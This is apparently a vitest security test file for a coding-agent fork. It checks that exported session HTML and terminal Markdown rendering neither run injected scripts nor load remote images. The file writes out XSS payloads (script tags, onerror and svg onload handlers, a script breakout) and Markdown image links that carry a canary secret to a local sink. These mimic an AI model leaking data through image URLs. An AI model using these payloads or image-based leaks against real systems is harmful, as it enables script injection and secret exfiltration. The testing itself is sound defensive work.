import { spawn, spawnSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Markdown, resetCapabilitiesCache, setCapabilities, type TUI } from "@earendil-works/pi-tui";
import { afterEach, describe, expect, it } from "vitest";
import { exportFromFile } from "../src/core/export-html/index.ts";
import { readRenderers } from "../src/core/tools/renderers/read.ts";
import { LoginDialogComponent } from "../src/modes/interactive/components/login-dialog.ts";
import { getMarkdownTheme, initTheme, theme } from "../src/modes/interactive/theme/theme.ts";

const payloads = JSON.parse(
	readFileSync(new URL("./fixtures/hostile-render-payloads.json", import.meta.url), "utf8"),
) as Record<string, string>;
const firefox = spawnSync("firefox", ["--version"], { encoding: "utf8" }).status === 0;

describe("fork: safe HTML export", () => {
	const tempDirs: string[] = [];
	afterEach(() => {
		for (const directory of tempDirs.splice(0)) rmSync(directory, { recursive: true, force: true });
	});

	it("exports hostile session text without executable content or remote image loads", async () => {
		const directory = mkdtempSync(join(tmpdir(), "prism-safe-export-"));
		tempDirs.push(directory);
		const sessionPath = join(directory, "session.jsonl");
		const outputPath = join(directory, "session.html");
		const message = Object.values(payloads).join("\n");
		const header = {
			type: "session",
			version: 3,
			id: "safe-test",
			timestamp: new Date(0).toISOString(),
			cwd: directory,
		};
		const entry = {
			type: "message",
			id: "message-1",
			parentId: null,
			timestamp: new Date(0).toISOString(),
			message: { role: "user", content: [{ type: "text", text: message }], timestamp: 0 },
		};
		writeFileSync(sessionPath, `${JSON.stringify(header)}\n${JSON.stringify(entry)}\n`);
		await exportFromFile(sessionPath, { outputPath });
		const html = readFileSync(outputPath, "utf8");
		expect(html).toMatch(/Content-Security-Policy/);
		expect(html).toMatch(/default-src 'none'.*connect-src 'none'/);
		expect(html).toMatch(/script-src 'nonce-[A-Za-z0-9+/]+=*'/);
		expect(html).not.toContain("{{NONCE}}");
		// The session text is base64 in the file and rendered in the browser: see the browser test below.
		expect(html).toContain("remote-image-placeholder");
	});

	// The export renders Markdown in the browser, from base64 session data: only a real browser shows
	// what loads or runs. Firefox headless opens the export from a local server that counts requests.
	it.skipIf(!firefox)(
		"loads no remote image and runs no injected script when opened in a browser",
		async () => {
			const hits: string[] = [];
			const pages = new Map<string, string>();
			const server = createServer((request, response) => {
				const page = pages.get(request.url ?? "");
				if (page) {
					response.setHeader("content-type", "text/html");
					response.end(page);
					return;
				}
				hits.push(request.url ?? "");
				response.end("x");
			});
			await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
			const origin = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
			try {
				const beacon = (name: string) => `new Image().src='${origin}/xss-${name}'`;
				const text = [
					`![secret](${origin}/leak-image)`,
					`![ref][r]\n\n[r]: ${origin}/leak-reference`,
					`<img src="${origin}/leak-html-image">`,
					`<script>${beacon("script")}</script>`,
					`<img src=x onerror="${beacon("onerror")}">`,
					`<svg onload="${beacon("svg")}"></svg>`,
					`</script><script>${beacon("breakout")}</script>`,
				].join("\n\n");
				const directory = mkdtempSync(join(tmpdir(), "prism-safe-export-browser-"));
				tempDirs.push(directory);
				const sessionPath = join(directory, "session.jsonl");
				const usage = { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, totalTokens: 0 };
				const entries = [
					{ type: "session", version: 3, id: "browser", timestamp: new Date(0).toISOString(), cwd: directory },
					{
						type: "message",
						id: "m1",
						parentId: null,
						timestamp: new Date(0).toISOString(),
						message: { role: "user", content: [{ type: "text", text }], timestamp: 0 },
					},
					{
						type: "message",
						id: "m2",
						parentId: "m1",
						timestamp: new Date(0).toISOString(),
						message: {
							role: "assistant",
							content: [{ type: "text", text }],
							api: "faux",
							provider: "faux",
							model: "faux",
							usage: { ...usage, cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, total: 0 } },
							stopReason: "stop",
							timestamp: 0,
						},
					},
				];
				writeFileSync(sessionPath, `${entries.map((entry) => JSON.stringify(entry)).join("\n")}\n`);
				const outputPath = join(directory, "session.html");
				await exportFromFile(sessionPath, { outputPath });
				const html = readFileSync(outputPath, "utf8");
				// A probe at the end of the export's own script proves it ran and rendered both messages.
				const probe = `;new Image().src='${origin}/rendered-'+document.querySelectorAll('.markdown-content').length;`;
				const withProbe = (page: string) =>
					page.replace(/\n {2}<\/script>\n<\/body>/, `${probe}\n  </script>\n</body>`);
				// With the CSP (the probe's host allowed for images), and without it, to test the escaping alone.
				pages.set("/csp.html", withProbe(html.replace("img-src data:", `img-src data: ${origin}`)));
				pages.set("/no-csp.html", withProbe(html.replace(/<meta http-equiv="Content-Security-Policy"[^>]*>/, "")));
				expect(pages.get("/csp.html")).toContain(probe);
				expect(pages.get("/no-csp.html")).not.toContain("Content-Security-Policy");
				for (const page of ["/csp.html", "/no-csp.html"]) {
					hits.length = 0;
					const profile = mkdtempSync(join(tmpdir(), "prism-firefox-profile-"));
					tempDirs.push(profile);
					const child = spawn(
						"firefox",
						[
							"--headless",
							"--no-remote",
							"--profile",
							profile,
							"--screenshot",
							join(directory, "shot.png"),
							`${origin}${page}`,
						],
						{ stdio: "ignore", env: { ...process.env, HOME: profile, MOZ_HEADLESS: "1" } },
					);
					try {
						await new Promise<void>((resolve, reject) => {
							const timer = setTimeout(() => reject(new Error(`firefox timed out on ${page}`)), 60_000);
							child.on("exit", () => {
								clearTimeout(timer);
								resolve();
							});
						});
					} finally {
						if (child.exitCode === null) child.kill("SIGKILL");
					}
					await new Promise((resolve) => setTimeout(resolve, 300));
					expect({ page, hits }).toEqual({ page, hits: ["/rendered-2"] });
				}
			} finally {
				await new Promise<void>((resolve) => server.close(() => resolve()));
			}
		},
		150_000,
	);
});

describe("fork: Prism's own links survive the render sanitizer", () => {
	afterEach(() => resetCapabilitiesCache());

	// fork (SEC-03): `![](https://sink/?d=<secret>)` written by the model loads nothing in the terminal either, even one
	// that shows images: the image is written as its text and address.
	it("renders a Markdown image in the terminal as text, without loading it", async () => {
		const requests: string[] = [];
		const sink = createServer((request, response) => {
			requests.push(request.url ?? "");
			response.end();
		});
		await new Promise<void>((done) => sink.listen(0, "127.0.0.1", () => done()));
		const origin = `http://127.0.0.1:${(sink.address() as AddressInfo).port}`;
		try {
			initTheme("dark");
			for (const images of [null, "kitty", "iterm2"] as const) {
				setCapabilities({ images, trueColor: true, hyperlinks: true });
				const lines = new Markdown(
					`Done. ![status](${origin}/leak?d=sk-canary) and ![ref][r]\n\n[r]: ${origin}/leak-reference`,
					0,
					0,
					getMarkdownTheme(),
				).render(200);
				expect(lines.join("\n")).toContain(`[Image: status] (${origin}/leak?d=sk-canary)`);
			}
			await new Promise((done) => setTimeout(done, 200));
			expect(requests).toEqual([]);
		} finally {
			resetCapabilitiesCache();
			await new Promise((done) => sink.close(done));
		}
	});

	it("keeps the clickable path of a tool call and the login dialog links", () => {
		initTheme("dark");
		setCapabilities({ images: null, trueColor: true, hyperlinks: true });
		const call = readRenderers.renderCall?.({ path: "src/a.ts" }, theme, {
			cwd: "/tmp/project",
			expanded: true,
		} as Parameters<NonNullable<typeof readRenderers.renderCall>>[2]);
		expect(call?.render(80).join("")).toMatch(/\x1b\]8;id=pi-[^;]+;file:\/\/\/tmp\/project\/src\/a\.ts/);
		const dialog = new LoginDialogComponent({ requestRender: () => {} } as unknown as TUI, "provider", () => {});
		dialog.showInfo("Sign in", [{ label: "Docs", url: "https://example.com/docs" }]);
		expect(dialog.render(80).join("")).toMatch(/\x1b\]8;id=pi-[^;]+;https:\/\/example\.com\/docs/);
	});
});
